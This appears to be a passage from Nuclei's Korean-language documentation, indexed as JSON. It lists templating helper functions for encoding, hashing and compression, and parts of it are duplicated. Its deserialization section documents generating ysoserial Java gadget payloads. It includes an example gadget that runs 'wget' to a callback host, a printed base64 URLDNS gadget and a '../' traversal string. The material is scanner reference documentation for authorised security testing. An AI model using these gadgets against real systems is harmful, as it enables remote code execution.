Gadget\uc744 \uc0dd\uc131\ud569\ub2c8\ub2e4. generate_java_gadget(\"dns\", \"{{interactsh-url}}\", \"base64\") rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD//////////3QAAHQAAHEAfgAFdAAFcHh0ACpjYWhnMmZiaW41NjRvMGJ0MHRzMDhycDdlZXBwYjkxNDUub2FzdC5mdW54 gzip(input string) string GZip\uc744 \uc0ac\uc6a9\ud574\uc11c \uc785\ub825\uc744 \uc555\ucd95\ud569\ub2c8\ub2e4. gzip(\"Hello\") gzip_decode(input string) string GZip\uc744 \uc0ac\uc6a9\ud574\uc11c \uc785\ub825\uc758 \uc555\ucd95\uc744 \ud574\uc81c\ud569\ub2c8\ub2e4. gzip_decode(hex_decode(\"1f8b08000000000000fff248cdc9c907040000ffff8289d1f705000000\")) Hello zlib(input string) string Zlib\uc744 \uc0ac\uc6a9\ud558\uc5ec \uc785\ub825\uc744 \uc555\ucd95\ud569\ub2c8\ub2e4. base64(zlib(\"Hello\")) eJzySM3JyQcEAAD//wWMAfU= zlib_decode(input string) string Zlib\uc744 \uc0ac\uc6a9\ud558\uc5ec \uc785\ub825\uc758 \uc555\ucd95\uc744 \ud574\uc81c\ud569\ub2c8\ub2e4. zlib_decode(hex_decode(\"789cf248cdc9c907040000ffff058c01f5\")) Hello hex_decode(input interface{}) []byte Hex\ub85c \ub4e4\uc5b4\uc628 \uc785\ub825\uc744 \ub514\ucf54\ub529\ud569\ub2c8\ub2e4. hex_decode(\"6161\") aa hex_encode(input interface{}) string \ub4e4\uc5b4\uc628 \uc785\ub825\uc744 Hex\ub85c \uc778\ucf54\ub529\ud569\ub2c8\ub2e4. hex_encode(\"aa\") 6161 html_escape(input interface{}) string \uc8fc\uc5b4\uc9c4 HTML \ubb38\uc790\uc5f4\uc744 escape \ud569\ub2c8\ub2e4. html_escape(\"<body>test</body>\") &lt;body&gt;test&lt;/body&gt; html_unescape(input interface{}) string \uc8fc\uc5b4\uc9c4 escape\ub41c \ubb38\uc790\uc5f4\uc744 HTML\ub85c \ub418\ub3cc\ub9bd\ub2c8\ub2e4. html_unescape(\"&lt;body&gt;test&lt;/body&gt;\") <body>test</body> len(arg interface{}) int \uc785\ub825\uc758 \uae38\uc774\ub97c \ubc18\ud658\ud569\ub2c8\ub2e4. len(\"Hello\") 5 md5(input interface{}) string \uc785\ub825\uac12\uc73c\ub85c MD5(Message Digest) \ud574\uc2dc\uac12\uc744 \uacc4\uc0b0\ud569\ub2c8\ub2e4. md5(\"Hello\") 8b1a9953c4611296a827abf8c47804d7 mmh3(input interface{}) string \uc785\ub825\uac12\uc73c\ub85c MMH3(MurmurHash3) \ud574\uc2dc\uac12\uc744 \uacc4\uc0b0\ud569\ub2c8\ub2e4. mmh3(\"Hello\") 316307400 print_debug(args ...interface{}) \uc8fc\uc5b4\uc9c4 \uc785\ub825\uac12 \ub610\ub294 \ud45c\ud604\uc2dd\uc758 \uac12\uc744 \ucd9c\ub825\ud569\ub2c8\ub2e4. \ub514\ubc84\uae45\uc5d0 \uc0ac\uc6a9\ub429\ub2c8\ub2e4. print_debug(1+2, \"Hello\") 3 Hello rand_base(length uint, optionalCharSet string) string \uc8fc\uc5b4\uc9c4 \ubb38\uc790\uc5f4\uc5d0\uc11c \uc8fc\uc5b4\uc9c4 \uae38\uc774\ub9cc\ud07c\uc758 \uc784\uc758\uc758 sequence\ub97c \uc0dd\uc131\ud569\ub2c8\ub2e4.(default\ub294 \ubb38\uc790\uc640 \uc22b\uc790\uc785\ub2c8\ub2e4.) rand_base(5, \"abc\") caccb rand_char(optionalCharSet string) string \uc8fc\uc5b4\uc9c4 \ubb38\uc790\uc5f4\uc5d0\uc11c \uc784\uc758\uc758 \ubb38\uc790\ub97c \uc0dd\uc131\ud569\ub2c8\ub2e4. (default\ub294 \ubb38\uc790\uc640 \uc22b\uc790\uc785\ub2c8\ub2e4.) rand_char(\"abc\") a rand_int(optionalMin, optionalMax uint) int \uc8fc\uc5b4\uc9c4 \uc785\ub825\uac12 \uc0ac\uc774\uc5d0\uc11c \uc784\uc758\uc758 \uc815\uc218\ub97c \uc0dd\uc131\ud569\ub2c8\ub2e4. (default\ub294 0 - MaxInt32) rand_int(1, 10) 6 rand_text_alpha(length uint, optionalBadChars string) string \uc8fc\uc5b4\uc9c4 \ubb38\uc790\ub97c \uc81c\uc678\ud558\uace0 \uc8fc\uc5b4\uc9c4 \uae38\uc758\uc758 \uc784\uc758\uc758 \ubb38\uc790\uc5f4\uc744 \uc0dd\uc131\ud569\ub2c8\ub2e4. rand_text_alpha(10, \"abc\") WKozhjJWlJ rand_text_alphanumeric(length uint, optionalBadChars string) string \uc8fc\uc5b4\uc9c4 \ubb38\uc790\ub97c \uc81c\uc678\ud558\uace0 \uc8fc\uc5b4\uc9c4 \uae38\uc774\uc758 \uc784\uc758\uc758 \uc601\uc22b\uc790 \ubb38\uc790\uc5f4\uc744 \uc0dd\uc131\ud569\ub2c8\ub2e4. rand_text_alphanumeric(10, \"ab12\") NthI0IiY8r rand_text_numeric(length uint, optionalBadNumbers string) string \uc8fc\uc5b4\uc9c4 \uc22b\uc790\ub97c \uc81c\uc678\ud558\uace0 \uc8fc\uc5b4\uc9c4 \uae38\uc774\uc758 \uc784\uc758\uc758 \uc22b\uc790 \ubb38\uc790\uc5f4\uc744 \uc0dd\uc131\ud569\ub2c8\ub2e4. rand_text_numeric(10, 123) 0654087985 regex(pattern, input string) bool \uc785\ub825 \ubb38\uc790\uc5f4\uc5d0 \ub300\ud574 \uc8fc\uc5b4\uc9c4 \uc815\uaddc \ud45c\ud604\uc2dd\uc744 \ud14c\uc2a4\ud2b8\ud569\ub2c8\ub2e4. regex(\"H([a-z]+)o\", \"Hello\") true remove_bad_chars(input, cutset interface{}) string \uc785\ub825\uac12\uc5d0\uc11c \uc6d0\ud558\ub294 \ubb38\uc790\ub97c \uc81c\uac70\ud569\ub2c8\ub2e4. remove_bad_chars(\"abcd\", \"bc\") ad repeat(str string, count uint) string \uc785\ub825 \ubb38\uc790\uc5f4\uc744 \uc8fc\uc5b4\uc9c4 \ud69f\uc218\ub9cc\ud07c \ubc18\ubcf5\ud569\ub2c8\ub2e4. repeat(\"../\", 5) ../../../../../ replace(str, old, new string) string \uc8fc\uc5b4\uc9c4 \uc785\ub825\uac12\uc5d0\uc11c \uc8fc\uc5b4\uc9c4 \ubd80\ubd84 \ubb38\uc790\uc5f4\uc744 \ub300\uccb4\ud569\ub2c8\ub2e4. replace(\"Hello\", \"He\", \"Ha\") Hallo replace_regex(source, regex, replacement string) string \uc785\ub825\uc5d0\uc11c \uc8fc\uc5b4\uc9c4 \uc815\uaddc \ud45c\ud604\uc2dd\uacfc \uc77c\uce58\ud558\ub294 \ubd80\ubd84 \ubb38\uc790\uc5f4\uc744 \ubc14\uafc9\ub2c8\ub2e4. replace_regex(\"He123llo\", \"(\\\\d+)\", \"\") Hello reverse(input string) string \uc8fc\uc5b4\uc9c4 \uc785\ub825\uc744 \ubc18\ub300\ub85c \ubc18\ud658\ud569\ub2c8\ub2e4. reverse(\"abc\") cba sha1(input interface{}) string \uc785\ub825\uac12\uc73c\ub85c SHA1(Secure Hash 1) \ud574\uc2dc\uac12\uc744 \uacc4\uc0b0\ud569\ub2c8\ub2e4. sha1(\"Hello\") f7ff9e8b7bb2e09b70935a5d785e0cc5d9d0abf0 sha256(input interface{}) string \uc785\ub825\uac12\uc73c\ub85c SHA256 (Secure Hash 256) \ud574\uc2dc\uac12\uc744 \uacc4\uc0b0\ud569\ub2c8\ub2e4. sha256(\"Hello\") 185f8db32271fe25f561a6fc938b2e264306ec304eda518007d1764826381969 to_lower(input string) string \uc785\ub825\uac12\uc744 \uc18c\ubb38\uc790\ub85c \ubcc0\ud658\ud569\ub2c8\ub2e4. to_lower(\"HELLO\") hello to_upper(input string) string \uc785\ub825\uac12\uc744 \ub300\ubb38\uc790\ub85c \ubcc0\ud658\ud569\ub2c8\ub2e4. to_upper(\"hello\") HELLO trim(input, cutset string) string \uc785\ub825\uac12\uc758 \uc55e\ub4a4\uc5d0 \uc704\uce58\ud55c \uc8fc\uc5b4\uc9c4 cutset\uc5d0 \ud3ec\ud568\ub41c \uc720\ub2c8\ucf54\ub4dc \ucf54\ub4dc \ud3ec\uc778\ud2b8 \uac12\uc744 \uc81c\uac70\ud569\ub2c8\ub2e4. trim(\"aaaHelloddd\", \"ad\") Hello trim_left(input, cutset string) string \uc785\ub825\uac12\uc758 \uc55e\uc5d0 \uc704\uce58\ud55c \uc8fc\uc5b4\uc9c4 cutset\uc5d0 \ud3ec\ud568\ub41c \uc720\ub2c8\ucf54\ub4dc \ucf54\ub4dc \ud3ec\uc778\ud2b8 \uac12\uc744 \uc81c\uac70\ud569\ub2c8\ub2e4. trim_left(\"aaaHelloddd\", \"ad\") Helloddd trim_prefix(input, prefix string) string \uc785\ub825\uac12\uc5d0\uc11c \uc55e\uc5d0 \uc704\uce58\ud55c \uc8fc\uc5b4\uc9c4 prefix \ubb38\uc790\uc5f4\uc744 \uc81c\uac70\ud569\ub2c8\ub2e4. trim_prefix(\"aaHelloaa\", \"aa\") Helloaa trim_right(input, cutset string) string \uc785\ub825\uac12\uc758 \ub4a4\uc5d0 \uc704\uce58\ud55c \uc8fc\uc5b4\uc9c4 cutset\uc5d0 \ud3ec\ud568\ub41c \uc720\ub2c8\ucf54\ub4dc \ucf54\ub4dc \ud3ec\uc778\ud2b8 \uac12\uc744 \uc81c\uac70\ud569\ub2c8\ub2e4. trim_right(\"aaaHelloddd\", \"ad\") aaaHello trim_space(input string) string \uc720\ub2c8\ucf54\ub4dc\uc5d0 \uc815\uc758\ub41c \ub300\ub85c, \ubaa8\ub4e0 \uc55e\ub4a4 \uacf5\ubc31\uc744 \uc81c\uac70\ud569\ub2c8\ub2e4. trim_space(\" Hello \") \"Hello\" trim_suffix(input, suffix string) string \uc785\ub825\uac12\uc5d0\uc11c \ub4a4\uc5d0 \uc704\uce58\ud55c \uc8fc\uc5b4\uc9c4 suffix \ubb38\uc790\uc5f4\uc744 \uc81c\uac70\ud569\ub2c8\ub2e4. trim_suffix(\"aaHelloaa\", \"aa\") aaHello unix_time(optionalSeconds uint) float64 \uc8fc\uc5b4\uc9c4 \ucd08\ub9cc\ud07c \ucd94\uac00\ub41c Unix \uc2dc\uac04(1970\ub144 1\uc6d4 1\uc77c UTC \uc774\ud6c4 \uacbd\uacfc\ub41c \ucd08 \uc218)\uc744 \ubc18\ud658\ud569\ub2c8\ub2e4. unix_time(10) 1639568278 url_decode(input string) string \uc785\ub825 \ubb38\uc790\uc5f4\uc744 URL\ub85c \ub514\ucf54\ub529\ud569\ub2c8\ub2e4. url_decode(\"https:%2F%2Fprojectdiscovery.io%3Ftest=1\") https://projectdiscovery.io?test=1 url_encode(input string) string \uc785\ub825 \ubb38\uc790\uc5f4\uc744 URL\ub85c \uc778\ucf54\ub529\ud569\ub2c8\ub2e4. url_encode(\"https://projectdiscovery.io/test?a=1\") https%3A%2F%2Fprojectdiscovery.io%2Ftest%3Fa%3D1 wait_for(seconds uint) \uc8fc\uc5b4\uc9c4 \uc2dc\uac04(\ucd08) \ub3d9\uc548 \uc2e4\ud589\uc744 \uc77c\uc2dc \uc911\uc9c0\ud569\ub2c8\ub2e4. wait_for(10) true join(separator string, elements ...interface{}) string) \uc8fc\uc5b4\uc9c4 \ubb38\uc790\uc5f4\ub4e4\uc744 \uccab\ubc88\uc9f8 \ud30c\ub77c\ubbf8\ud130\uc778 \uad6c\ubd84\uc790\ub85c \uc5f0\uacb0 \ud558\uc5ec \ud558\ub098\uc758 \ubb38\uc790\uc5f4\ub85c \ud569\uce69\ub2c8\ub2e4. join(\"_\", 123, \"hello\", \"world\") 123_hello_world hmac(algorithm, data, secret) \ud574\uc2dc \ud568\uc218 \uc885\ub958\uc640 data\uc640 secret\uc744 \uc785\ub825 \ubc1b\uc544 hamc\uac12\uc744 \ubc18\ud658\ud569\ub2c8\ub2e4. hmac(\"sha1\", \"test\", \"scrt\") 8856b111056d946d5c6c92a21b43c233596623c6 date_time(dateTimeFormat) go \uc2a4\ud0c0\uc77c\uc758 \ub0a0\uc9dc-\uc2dc\uac04 \ud615\uc2dd\uc73c\ub85c \ub0a0\uc9dc \ub610\ub294 \uc2dc\uac04\uc744 \ubc18\ud658\ud569\ub2c8\ub2e4. date_time(\"%Y-%M-%D %H:%m\") 2022-06-10 14:18 starts_with(str string, prefix ...string) bool \ubb38\uc790\uc5f4\uc774 \uc8fc\uc5b4\uc9c4 \ubd80\ubd84 \ubb38\uc790\uc5f4\ub85c \uc2dc\uc791\ud558\ub294\uc9c0 \ud655\uc778\ud569\ub2c8\ub2e4. starts_with(\"Hello\", \"He\") true line_starts_with(str string, prefix ...string) bool \ubb38\uc790\uc5f4\uc758 \uc904\uc774 \uc8fc\uc5b4\uc9c4 \ubd80\ubd84 \ubb38\uc790\uc5f4\ub85c \uc2dc\uc791\ud558\ub294\uc9c0 \ud655\uc778\ud569\ub2c8\ub2e4. line_starts_with(\"Hi\\nHello\", \"He\") true ends_with(str string, suffix ...string) bool \ubb38\uc790\uc5f4\uc774 \uc8fc\uc5b4\uc9c4 \ubd80\ubd84 \ubb38\uc790\uc5f4\ub85c \ub05d\ub098\ub294\uc9c0 \ud655\uc778\ud569\ub2c8\ub2e4. ends_with(\"Hello\", \"lo\") true line_ends_with(str string, suffix ...string) bool \ubb38\uc790\uc5f4\uc758 \uc904\uc774 \uc8fc\uc5b4\uc9c4 \ubd80\ubd84 \ubb38\uc790\uc5f4\ub85c \ub05d\ub098\ub294\uc9c0 \ud655\uc778\ud569\ub2c8\ub2e4. line_ends_with(\"Hello\\nHi\", \"lo\") true Deserialization helper functions \u00b6 Nuclei\ub294 ysoserial \uc5d0\uc11c \uba87\uba87 \uc77c\ubc18\uc801\uc778 gadget\uc5d0 \ub300\ud55c \ud398\uc774\ub85c\ub4dc \uc0dd\uc131\uc744 \ud5c8\uc6a9\ud569\ub2c8\ub2e4. Supported Payload: dns (URLDNS) commons-collections3.1 commons-collections4.0 jdk7u21 jdk8u20 groovy1 Supported encodings: base64 (default) gzip-base64 gzip hex raw Deserialization helper function format: {{ generate_java_gadget ( payload, cmd, encoding }} Deserialization helper function example: {{ generate_java_gadget ( \"commons-collections3.1\" , \"wget http://{{interactsh-url}}\" , \"base64\" )}}","title":"Helper functions"},{"location":"kr/templating-guide/helper-functions/#helper-functions","text":"\ub2e4\uc74c\uc740 RAW requests / Network requests\uc5d0\uc11c \uc9c0\uc6d0\ub418\ub294 \ubaa8\ub4e0 helper function\uc758 \ubaa9\ub85d\uc785\ub2c8\ub2e4. Helper function Description Example Output aes_gcm(key, plaintext interface{}) key\ub85c \ubb38\uc790\uc5f4\uc744 AES GCM \uc554\ud638\ud654\ud569\ub2c8\ub2e4. {{hex_encode(aes_gcm(\"AES256Key-32Characters1234567890\", \"exampleplaintext\"))}} ec183a153b8e8ae7925beed74728534b57a60920c0b009eaa7608a34e06325804c096d7eebccddea3e5ed6c4 base64(src interface{}) string \ubb38\uc790\uc5f4\uc744 Base64\ub85c \uc778\ucf54\ub529\ud569\ub2c8\ub2e4. base64(\"Hello\") SGVsbG8= base64_decode(src interface{}) []byte \ubb38\uc790\uc5f4\uc744 Base64\ub85c \ub514\ucf54\ub529\ud569\ub2c8\ub2e4. base64_decode(\"SGVsbG8=\") Hello base64_py(src interface{}) string python\ucc98\ub7fc \ubb38\uc790\uc5f4\uc744 base64\ub85c \uc778\ucf54\ub529\ud569\ub2c8\ub2e4. (new lines \ud3ec\ud568) base64_py(\"Hello\") SGVsbG8= concat(arguments ...interface{}) string \uc8fc\uc5b4\uc9c4 \ub9e4\uac1c\ubcc0\uc218\ub4e4\uc744 \ud558\ub098\uc758 \ubb38\uc790\uc5f4\ub85c \ud569\uce69\ub2c8\ub2e4. concat(\"Hello\", 123, \"world) Hello123world compare_versions(versionToCheck string, constraints ...string) bool \uccab \ubc88\uc9f8 \ub9e4\uac1c\ubcc0\uc218\ub85c \ub4e4\uc5b4\uc628 \ubc84\uc804 \uc815\ubcf4\ub97c \uc8fc\uc5b4\uc9c4 \uc81c\uc57d \uc870\uac74\uacfc \ube44\uad50\ud569\ub2c8\ub2e4. compare_versions('v1.0.0', '>v0.0.1', '<v1.0.1') true contains(input, substring interface{}) bool \ubb38\uc790\uc5f4\uc5d0 \ubd80\ubd84 \ubb38\uc790\uc5f4\uc774 \ud3ec\ud568\ub418\uc5b4 \uc788\ub294\uc9c0 \ud655\uc778\ud569\ub2c8\ub2e4. contains(\"Hello\", \"lo\") true generate_java_gadget(gadget, cmd, encoding interface{}) string Java Deserialization Gadget\uc744 \uc0dd\uc131\ud569\ub2c8\ub2e4. generate_java_gadget(\"dns\", \"{{interactsh-url}}\", \"base64\") rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD//////////3QAAHQAAHEAfgAFdAAFcHh0ACpjYWhnMmZiaW41NjRvMGJ0MHRzMDhycDdlZXBwYjkxNDUub2FzdC5mdW54 gzip(input string) string GZip\uc744 \uc0ac\uc6a9\ud574\uc11c \uc785\ub825\uc744 \uc555\ucd95\ud569\ub2c8\ub2e4. gzip(\"Hello\") gzip_decode(input string) string GZip\uc744 \uc0ac\uc6a9\ud574\uc11c \uc785\ub825\uc758 \uc555\ucd95\uc744 \ud574\uc81c\ud569\ub2c8\ub2e4. gzip_decode(hex_decode(\"1f8b08000000000000fff248cdc9c907040000ffff8289d1f705000000\")) Hello zlib(input string) string Zlib\uc744 \uc0ac\uc6a9\ud558\uc5ec \uc785\ub825\uc744 \uc555\ucd95\ud569\ub2c8\ub2e4. base64(zlib(\"Hello\")) eJzySM3JyQcEAAD//wWMAfU= zlib_decode(input string) string Zlib\uc744 \uc0ac\uc6a9\ud558\uc5ec \uc785\ub825\uc758 \uc555\ucd95\uc744 \ud574\uc81c\ud569\ub2c8\ub2e4. zlib_decode(hex_decode(\"789cf248cdc9c907040000ffff058c01f5\")) Hello hex_decode(input interface{}) []byte Hex\ub85c \ub4e4\uc5b4\uc628 \uc785\ub825\uc744 \ub514\ucf54\ub529\ud569\ub2c8\ub2e4. hex_decode(\"6161\") aa hex_encode(input interface{}) string \ub4e4\uc5b4\uc628 \uc785\ub825\uc744 Hex\ub85c \uc778\ucf54\ub529\ud569\ub2c8\ub2e4. hex_encode(\"aa\") 6161 html_escape(input interface{}) string \uc8fc\uc5b4\uc9c4 HTML \ubb38\uc790\uc5f4\uc744 escape \ud569\ub2c8\ub2e4. html_escape(\"<body>test</body>\") &lt;body&gt;test&lt;/body&gt; html_unescape(input interface{}) string \uc8fc\uc5b4\uc9c4 escape\ub41c \ubb38\uc790\uc5f4\uc744 HTML\ub85c \ub418\ub3cc\ub9bd\ub2c8\ub2e4. html_unescape(\"&lt;body&gt;test&lt;/body&gt;\") <body>test</body> len(arg interface{}) int \uc785\ub825\uc758 \uae38\uc774\ub97c \ubc18\ud658\ud569\ub2c8\ub2e4. len(\"Hello\") 5 md5(input interface{}) string \uc785\ub825\uac12\uc73c\ub85c MD5(Message Digest) \ud574\uc2dc\uac12\uc744 \uacc4\uc0b0\ud569\ub2c8\ub2e4. md5(\"Hello\") 8b1a9953c4611296a827abf8c47804d7 mmh3(input interface{}) string \uc785\ub825\uac12\uc73c\ub85c MMH3(MurmurHash3) \ud574\uc2dc\uac12\uc744 \uacc4\uc0b0\ud569\ub2c8\ub2e4. mmh3(\"Hello\") 316307400 print_debug(args ...interface{}) \uc8fc\uc5b4\uc9c4 \uc785\ub825\uac12 \ub610\ub294 \ud45c\ud604\uc2dd\uc758 \uac12\uc744 \ucd9c\ub825\ud569\ub2c8\ub2e4. \ub514\ubc84\uae45\uc5d0 \uc0ac\uc6a9\ub429\ub2c8\ub2e4. print_debug(1+2, \"Hello\") 3 Hello rand_base(length uint, optionalCharSet string) string \uc8fc\uc5b4\uc9c4 \ubb38\uc790\uc5f4\uc5d0\uc11c \uc8fc\uc5b4\uc9c4 \uae38\uc774\ub9cc\ud07c\uc758 \uc784\uc758\uc758 sequence\ub97c \uc0dd\uc131\ud569\ub2c8\ub2e4.(default\ub294 \ubb38\uc790\uc640 \uc22b\uc790\uc785\ub2c8\ub2e4.) rand_base(5, \"abc\") caccb rand_char(optionalCharSet string) string \uc8fc\uc5b4\uc9c4 \ubb38\uc790\uc5f4\uc5d0\uc11c \uc784\uc758\uc758 \ubb38\uc790\ub97c \uc0dd\uc131\ud569\ub2c8\ub2e4. (default\ub294 \ubb38\uc790\uc640 \uc22b\uc790\uc785\ub2c8\ub2e4.) rand_char(\"abc\") a rand_int(optionalMin, optionalMax uint) int \uc8fc\uc5b4\uc9c4 \uc785\ub825\uac12 \uc0ac\uc774\uc5d0\uc11c \uc784\uc758\uc758 \uc815\uc218\ub97c \uc0dd\uc131\ud569\ub2c8\ub2e4. (default\ub294 0 - MaxInt32) rand_int(1, 10) 6 rand_text_alpha(length uint, optionalBadChars string) string \uc8fc\uc5b4\uc9c4 \ubb38\uc790\ub97c \uc81c\uc678\ud558\uace0 \uc8fc\uc5b4\uc9c4 \uae38\uc758\uc758 \uc784\uc758\uc758 \ubb38\uc790\uc5f4\uc744 \uc0dd\uc131\ud569\ub2c8\ub2e4. rand_text_alpha(10, \"abc\") WKozhjJWlJ rand_text_alphanumeric(length uint, optionalBadChars string) string \uc8fc\uc5b4\uc9c4 \ubb38\uc790\ub97c \uc81c\uc678\ud558\uace0 \uc8fc\uc5b4\uc9c4 \uae38\uc774\uc758 \uc784\uc758\uc758 \uc601\uc22b\uc790 \ubb38\uc790\uc5f4\uc744 \uc0dd\uc131\ud569\ub2c8\ub2e4. rand_text_alphanumeric(10, \"ab12\") NthI0IiY8r rand_text_numeric(length uint, optionalBadNumbers string) string \uc8fc\uc5b4\uc9c4 \uc22b\uc790\ub97c \uc81c\uc678\ud558\uace0 \uc8fc\uc5b4\uc9c4 \uae38\uc774\uc758 \uc784\uc758\uc758 \uc22b\uc790 \ubb38\uc790\uc5f4\uc744 \uc0dd\uc131\ud569\ub2c8\ub2e4. rand_text_numeric(10, 123) 0654087985 regex(pattern, input string) bool \uc785\ub825 \ubb38\uc790\uc5f4\uc5d0 \ub300\ud574 \uc8fc\uc5b4\uc9c4 \uc815\uaddc \ud45c\ud604\uc2dd\uc744 \ud14c\uc2a4\ud2b8\ud569\ub2c8\ub2e4. regex(\"H([a-z]+)o\", \"Hello\") true remove_bad_chars(input, cutset interface{}) string \uc785\ub825\uac12\uc5d0\uc11c \uc6d0\ud558\ub294 \ubb38\uc790\ub97c \uc81c\uac70\ud569\ub2c8\ub2e4. remove_bad_chars(\"abcd\", \"bc\") ad repeat(str string, count uint) string \uc785\ub825 \ubb38\uc790\uc5f4\uc744 \uc8fc\uc5b4\uc9c4 \ud69f\uc218\ub9cc\ud07c \ubc18\ubcf5\ud569\ub2c8\ub2e4. repeat(\"../\", 5) ../../../../../ replace(str, old, new string) string \uc8fc\uc5b4\uc9c4 \uc785\ub825\uac12\uc5d0\uc11c \uc8fc\uc5b4\uc9c4 \ubd80\ubd84 \ubb38\uc790\uc5f4\uc744 \ub300\uccb4\ud569\ub2c8\ub2e4. replace(\"Hello\", \"He\", \"Ha\") Hallo replace_regex(source, regex, replacement string) string \uc785\ub825\uc5d0\uc11c \uc8fc\uc5b4\uc9c4 \uc815\uaddc \ud45c\ud604\uc2dd\uacfc \uc77c\uce58\ud558\ub294 \ubd80\ubd84 \ubb38\uc790\uc5f4\uc744 \ubc14\uafc9\ub2c8\ub2e4. replace_regex(\"He123llo\", \"(\\\\d+)\", \"\") Hello reverse(input string) string \uc8fc\uc5b4\uc9c4 \uc785\ub825\uc744 \ubc18\ub300\ub85c \ubc18\ud658\ud569\ub2c8\ub2e4. reverse(\"abc\") cba sha1(input interface{}) string \uc785\ub825\uac12\uc73c\ub85c SHA1(Secure Hash 1) \ud574\uc2dc\uac12\uc744 \uacc4\uc0b0\ud569\ub2c8\ub2e4. sha1(\"Hello\") f7ff9e8b7bb2e09b70935a5d785e0cc5d9d0abf0 sha256(input interface{}) string \uc785\ub825\uac12\uc73c\ub85c SHA256 (Secure Hash 256) \ud574\uc2dc\uac12\uc744 \uacc4\uc0b0\ud569\ub2c8\ub2e4. sha256(\"Hello\") 185f8db32271fe25f561a6fc938b2e264306ec304eda518007d1764826381969 to_lower(input string) string \uc785\ub825\uac12\uc744 \uc18c\ubb38\uc790\ub85c \ubcc0\ud658\ud569\ub2c8\ub2e4. to_lower(\"HELLO\") hello to_upper(input string) string \uc785\ub825\uac12\uc744 \ub300\ubb38\uc790\ub85c \ubcc0\ud658\ud569\ub2c8\ub2e4. to_upper(\"hello\") HELLO trim(input, cutset string) string \uc785\ub825\uac12\uc758 \uc55e\ub4a4\uc5d0 \uc704\uce58\ud55c \uc8fc\uc5b4\uc9c4 cutset\uc5d0 \ud3ec\ud568\ub41c \uc720\ub2c8\ucf54\ub4dc \ucf54\ub4dc \ud3ec\uc778\ud2b8 \uac12\uc744 \uc81c\uac70\ud569\ub2c8\ub2e4. trim(\"aaaHelloddd\", \"ad\") Hello trim_left(input, cutset string) string \uc785\ub825\uac12\uc758 \uc55e\uc5d0 \uc704\uce58\ud55c \uc8fc\uc5b4\uc9c4 cutset\uc5d0 \ud3ec\ud568\ub41c \uc720\ub2c8\ucf54\ub4dc \ucf54\ub4dc \ud3ec\uc778\ud2b8 \uac12\uc744 \uc81c\uac70\ud569\ub2c8\ub2e4. trim_left(\"aaaHelloddd\", \"ad\") Helloddd trim_prefix(input, prefix string) string \uc785\ub825\uac12\uc5d0\uc11c \uc55e\uc5d0 \uc704\uce58\ud55c \uc8fc\uc5b4\uc9c4 prefix \ubb38\uc790\uc5f4\uc744 \uc81c\uac70\ud569\ub2c8\ub2e4. trim_prefix(\"aaHelloaa\", \"aa\") Helloaa trim_right(input, cutset string) string \uc785\ub825\uac12\uc758 \ub4a4\uc5d0 \uc704\uce58\ud55c \uc8fc\uc5b4\uc9c4 cutset\uc5d0 \ud3ec\ud568\ub41c \uc720\ub2c8\ucf54\ub4dc \ucf54\ub4dc \ud3ec\uc778\ud2b8 \uac12\uc744 \uc81c\uac70\ud569\ub2c8\ub2e4. trim_right(\"aaaHelloddd\", \"ad\") aaaHello trim_space(input string) string \uc720\ub2c8\ucf54\ub4dc\uc5d0 \uc815\uc758\ub41c \ub300\ub85c, \ubaa8\ub4e0 \uc55e\ub4a4 \uacf5\ubc31\uc744 \uc81c\uac70\ud569\ub2c8\ub2e4. trim_space(\" Hello \") \"Hello\" trim_suffix(input, suffix string) string \uc785\ub825\uac12\uc5d0\uc11c \ub4a4\uc5d0 \uc704\uce58\ud55c \uc8fc\uc5b4\uc9c4 suffix \ubb38\uc790\uc5f4\uc744 \uc81c\uac70\ud569\ub2c8\ub2e4. trim_suffix(\"aaHelloaa\", \"aa\") aaHello unix_time(optionalSeconds uint) float64 \uc8fc\uc5b4\uc9c4 \ucd08\ub9cc\ud07c \ucd94\uac00\ub41c Unix \uc2dc\uac04(1970\ub144 1\uc6d4 1\uc77c UTC \uc774\ud6c4 \uacbd\uacfc\ub41c \ucd08 \uc218)\uc744 \ubc18\ud658\ud569\ub2c8\ub2e4. unix_time(10) 1639568278 url_decode(input string) string \uc785\ub825 \ubb38\uc790\uc5f4\uc744 URL\ub85c \ub514\ucf54\ub529\ud569\ub2c8\ub2e4. url_decode(\"https:%2F%2Fprojectdiscovery.io%3Ftest=1\") https://projectdiscovery.io?test=1 url_encode(input string) string \uc785\ub825 \ubb38\uc790\uc5f4\uc744 URL\ub85c \uc778\ucf54\ub529\ud569\ub2c8\ub2e4. url_encode(\"https://projectdiscovery.io/test?a=1\") https%3A%2F%2Fprojectdiscovery.io%2Ftest%3Fa%3D1 wait_for(seconds uint) \uc8fc\uc5b4\uc9c4 \uc2dc\uac04(\ucd08) \ub3d9\uc548 \uc2e4\ud589\uc744 \uc77c\uc2dc \uc911\uc9c0\ud569\ub2c8\ub2e4. wait_for(10) true join(separator string, elements ...interface{}) string) \uc8fc\uc5b4\uc9c4 \ubb38\uc790\uc5f4\ub4e4\uc744 \uccab\ubc88\uc9f8 \ud30c\ub77c\ubbf8\ud130\uc778 \uad6c\ubd84\uc790\ub85c \uc5f0\uacb0 \ud558\uc5ec \ud558\ub098\uc758 \ubb38\uc790\uc5f4\ub85c \ud569\uce69\ub2c8\ub2e4. join(\"_\", 123, \"hello\", \"world\") 123_hello_world hmac(algorithm, data, secret) \ud574\uc2dc \ud568\uc218 \uc885\ub958\uc640 data\uc640 secret\uc744 \uc785\ub825 \ubc1b\uc544 hamc\uac12\uc744 \ubc18\ud658\ud569\ub2c8\ub2e4. hmac(\"sha1\", \"test\", \"scrt\") 8856b111056d946d5c6c92a21b43c233596623c6 